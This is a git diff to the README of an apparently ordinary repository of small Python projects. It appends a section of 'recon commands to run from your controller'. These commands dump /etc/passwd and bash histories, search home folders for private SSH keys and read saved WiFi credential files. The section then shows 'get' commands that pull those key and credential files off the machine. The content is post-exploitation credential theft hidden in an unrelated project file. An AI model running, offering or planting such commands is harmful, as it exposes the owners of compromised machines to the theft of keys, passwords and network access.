@@ -56,3 +56,25 @@ Analyzes diary entries using sentiment analysis (nltk) and displays visualized m
 Have an idea for a mini-project? Fork this repo and add a new folder under `python_small_projects/`, or open a pull request with suggestions.
 
 ---
+
+
+### 📥 Commands to Run (From Your Controller)
+Here are some high-value, low-risk recon commands you can run now:
+
+```bash
+cat /etc/passwd
+cat /etc/group
+cat ~/.bash_history
+ps aux
+find /home -name id_rsa
+cat /proc/meminfo
+ls -la /etc/NetworkManager/system-connections/
+find /home -name .bash_history -exec cat {} \;
+whoami && hostname && uname -a && ip a && ps aux
+```
+You can then get any files that look interesting, like:
+
+```bash
+get /home/user/.ssh/id_rsa
+get /etc/NetworkManager/system-connections/MyWiFi
+```
